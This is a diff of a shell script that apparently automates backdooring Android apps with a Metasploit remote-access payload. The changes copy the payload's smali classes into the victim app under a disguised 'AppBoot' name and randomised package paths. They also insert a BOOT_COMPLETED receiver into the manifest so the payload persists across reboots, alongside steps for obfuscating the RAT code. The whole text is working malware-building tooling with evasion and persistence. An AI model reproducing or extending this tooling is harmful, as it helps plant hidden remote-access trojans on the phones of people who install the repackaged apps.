@@ -141,7 +141,7 @@ mv $merged_manifest_file $original_manifest_file
 echo "done."
 
 # cleanup payload directory after merging app permissions
-rm -rf $MY_PATH/payload >> $LOG_FILE 2>&1
+rm -rf $MY_PATH/payload >>$LOG_FILE 2>&1
 
 # use dex2jar, proguard, and dx
 # to shrink, optimize, and obfuscate original Rat.apk code
@@ -194,7 +194,7 @@ tldlist_rand_line=`shuf -i 1-${tldlist_max_line} -n 1`
 namelist_max_line=`wc -l $MY_PATH/lists/namelist.txt |awk '{ print $1 }'`
 namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
 payload_tld=`sed "${tldlist_rand_line}q;d" $MY_PATH/lists/tldlist.txt`
-echo "payload_tld is: $payload_tld" >> $LOG_FILE 2>&1
+echo "payload_tld is: $payload_tld" >>$LOG_FILE 2>&1
 payload_primary_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
 echo "payload_primary_dir is: $payload_primary_dir" >>$LOG_FILE 2>&1
 namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
@@ -212,8 +212,12 @@ if [ $rc != 0 ]; then
 fi
 
 echo -n "[*] Copying RAT smali files to new directories in original project..."
-cp -v $MY_PATH/payload/smali/net/dirtybox/util/{a.smali,b.smali,c.smali} $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
+cp -v $MY_PATH/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
 rc=$?
+if [ $rc == 0 ]; then
+  cp -v $MY_PATH/payload/smali/net/dirtybox/util/{a.smali,b.smali,c.smali} $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
+  rc=$?
+fi
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to copy RAT smali files"
@@ -222,8 +226,16 @@ if [ $rc != 0 ]; then
 fi
 
 echo -n "[*] Fixing RAT smali files..."
-sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} >>$LOG_FILE 2>&1
+sed -i 's/MainBroadcastReceiver/AppBoot/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
 rc=$?
+if [ $rc == 0 ]; then
+  sed -i 's|com\([./]\)metasploit\([./]\)stage|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali,AppBoot.smali} >>$LOG_FILE 2>&1
+  rc=$?
+fi
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to fix RAT smali files"
@@ -269,6 +281,31 @@ rc=$?
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to add hook"
+  cleanup
+  exit $rc
+fi
+
+echo -n "[*] Adding persistence hook in original project..."
+cat >$MY_PATH/persistence.hook <<EOL
+        <receiver android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.AppBoot">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+EOL
+sed -i '0,/<\/activity>/s//<\/activity>\n'"$placeholder"'/' $original_manifest_file >>$LOG_FILE 2>&1
+rc=$?
+if [ $rc == 0 ]; then
+  sed -i '/'"$placeholder"'/r '"$MY_PATH"'/persistence.hook' $original_manifest_file >>$LOG_FILE 2>&1
+  rc=$?
+  if [ $rc == 0 ]; then
+    sed -i '/'"$placeholder"'/d' $original_manifest_file >>$LOG_FILE 2>&1
+    rc=$?
+  fi
+fi
+echo "done."
+if [ $rc != 0 ]; then
+  echo "[!] Failed to add persistence hook"
   cleanup
   exit $rc
 fi
